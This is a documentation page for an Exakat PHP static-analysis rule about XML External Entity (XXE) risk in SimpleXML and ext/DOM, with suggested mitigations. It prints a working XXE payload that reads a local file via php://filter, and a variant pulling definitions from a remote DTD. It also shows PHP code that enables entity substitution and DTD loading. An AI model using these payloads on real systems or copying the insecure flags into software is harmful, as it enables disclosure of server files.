.. _security-nonetforxmlload:

.. _no-net-for-xml-load:

No Net For Xml Load
+++++++++++++++++++

.. meta::
	:description:
		No Net For Xml Load: Simplexml and ext/DOM load all external entities from the web, by default.
	:twitter:card: summary_large_image
	:twitter:site: @exakat
	:twitter:title: No Net For Xml Load
	:twitter:description: No Net For Xml Load: Simplexml and ext/DOM load all external entities from the web, by default
	:twitter:creator: @exakat
	:twitter:image:src: https://www.exakat.io/wp-content/uploads/2020/06/logo-exakat.png
	:og:image: https://www.exakat.io/wp-content/uploads/2020/06/logo-exakat.png
	:og:title: No Net For Xml Load
	:og:type: article
	:og:description: Simplexml and ext/DOM load all external entities from the web, by default
	:og:url: https://exakat.readthedocs.io/en/latest/Reference/Rules/No Net For Xml Load.html
	:og:locale: en
.. raw:: html	<script type="application/ld+json">{"@context":"https:\/\/schema.org","@graph":[{"@type":"WebPage","@id":"https:\/\/php-tips.readthedocs.io\/en\/latest\/Reference\/Rules\/Security\/NoNetForXmlLoad.html","url":"https:\/\/php-tips.readthedocs.io\/en\/latest\/Reference\/Rules\/Security\/NoNetForXmlLoad.html","name":"No Net For Xml Load","isPartOf":{"@id":"https:\/\/www.exakat.io\/"},"datePublished":"Fri, 10 Jan 2025 09:46:18 +0000","dateModified":"Fri, 10 Jan 2025 09:46:18 +0000","description":"Simplexml and ext\/DOM load all external entities from the web, by default","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https:\/\/exakat.readthedocs.io\/en\/latest\/No Net For Xml Load.html"]}]},{"@type":"WebSite","@id":"https:\/\/www.exakat.io\/","url":"https:\/\/www.exakat.io\/","name":"Exakat","description":"Smart PHP static analysis","inLanguage":"en-US"}]}</script>Simplexml and ext/DOM load all external entities from the web, by default. This is dangerous, in particular when loading unknown XML code.

Look at this XML code below : it is valid. It defines an entity ``xxe``, that is filled with a file, read on the system and base64 encoded.::

   
   
   &lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt; ]&gt;
   <replace>&xxe;</replace>
   
   


This file could be processed with the following code : note, you can replace 'index.php' in the above entity by any valid filepath. 

 

Here, PHP tries to load the XML file, finds the entity, then solves the entity by encoding a file called ``index.php``. The source code of the file is not used as data in the XML file. 

At that point, the example illustrates how a XXE works : by using the XML `engine <https://www.php.net/engine>`_ to load external resources, and preprocessing the XML code. in fact, there is only one change to make this XML code arbitrarily injected :::

   
   
   &lt;!DOCTYPE replace [&lt;!ENTITY writer SYSTEM "https://www.example.com/entities.dtd"&gt; ]&gt;
   <replace>&xxe;</replace>
   
   


With the above example, the XML code is `static <https://www.php.net/manual/en/language.oop5.static.php>`_ (as, it never changes), but the 'xxe' definitions are loaded from a remove website, and are completely under the attacker control.

.. code-block:: php
   
   <?php 
       $dom = new DOMDocument();
       $dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
       $info = simplexml_import_dom($dom);
       
       print base64_decode($info[0]);
   ?>

See also `XML External Entity <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection>`_,, `XML External Entity (XXE) Processing <https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing>`_ and `Detecting and exploiting XXE in SAML Interfaces <https://web-in-security.blogspot.nl/2014/11/detecting-and-exploiting-xxe-in-saml.html>`_.

Connex PHP features
-------------------

  + `xml <https://php-dictionary.readthedocs.io/en/latest/dictionary/xml.ini.html>`_


Suggestions
___________

* Strip out any entity when using external XML
* Forbid any network to the XML engine, by configuring the XML engine without network access




Specs
_____

+--------------+-------------------------------------------------------------------------------------------------------------------------+
| Short name   | Security/NoNetForXmlLoad                                                                                                |
+--------------+-------------------------------------------------------------------------------------------------------------------------+
| Rulesets     | :ref:`All <ruleset-All>`, :ref:`Changed Behavior <ruleset-Changed-Behavior>`, :ref:`Security <ruleset-Security>`        |
+--------------+-------------------------------------------------------------------------------------------------------------------------+
| Exakat since | 1.0.11                                                                                                                  |
+--------------+-------------------------------------------------------------------------------------------------------------------------+
| PHP Version  | All                                                                                                                     |
+--------------+-------------------------------------------------------------------------------------------------------------------------+
| Severity     | Major                                                                                                                   |
+--------------+-------------------------------------------------------------------------------------------------------------------------+
| Time To Fix  | Slow (1 hour)                                                                                                           |
+--------------+-------------------------------------------------------------------------------------------------------------------------+
| Precision    | High                                                                                                                    |
+--------------+-------------------------------------------------------------------------------------------------------------------------+
| Available in | `Entreprise Edition <https://www.exakat.io/entreprise-edition>`_, `Exakat Cloud <https://www.exakat.io/exakat-cloud/>`_ |
+--------------+-------------------------------------------------------------------------------------------------------------------------+


